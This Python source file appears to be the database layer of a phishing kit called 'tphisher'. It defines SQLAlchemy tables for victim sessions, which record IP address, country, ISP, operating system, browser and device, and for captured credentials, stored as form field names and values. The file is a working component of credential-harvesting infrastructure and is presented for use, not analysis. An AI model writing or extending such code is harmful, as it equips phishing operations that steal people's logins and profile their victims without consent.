import os
import datetime
from sqlalchemy import create_engine, Column, Integer, String, Text, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

DB_DIR = "sessions"
os.makedirs(DB_DIR, exist_ok=True)

Base = declarative_base()

class VictimSession(Base):
    __tablename__ = "sessions"
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    session_id = Column(String(100), index=True)
    ip_address = Column(String(50))
    country = Column(String(50), default="Unknown")
    isp = Column(String(100), default="Unknown")
    os_info = Column(String(100))
    browser_info = Column(String(100))
    device_type = Column(String(50))
    timestamp = Column(DateTime, default=datetime.datetime.utcnow)

class CredentialLog(Base):
    __tablename__ = "credentials"
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    session_id = Column(String(100), index=True)
    field_name = Column(String(100))
    field_value = Column(Text)
    timestamp = Column(DateTime, default=datetime.datetime.utcnow)

def init_db(db_name="tphisher_default.db"):
    db_path = os.path.join(DB_DIR, db_name)
    engine = create_engine(f"sqlite:///{db_path}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
    return SessionLocal, db_path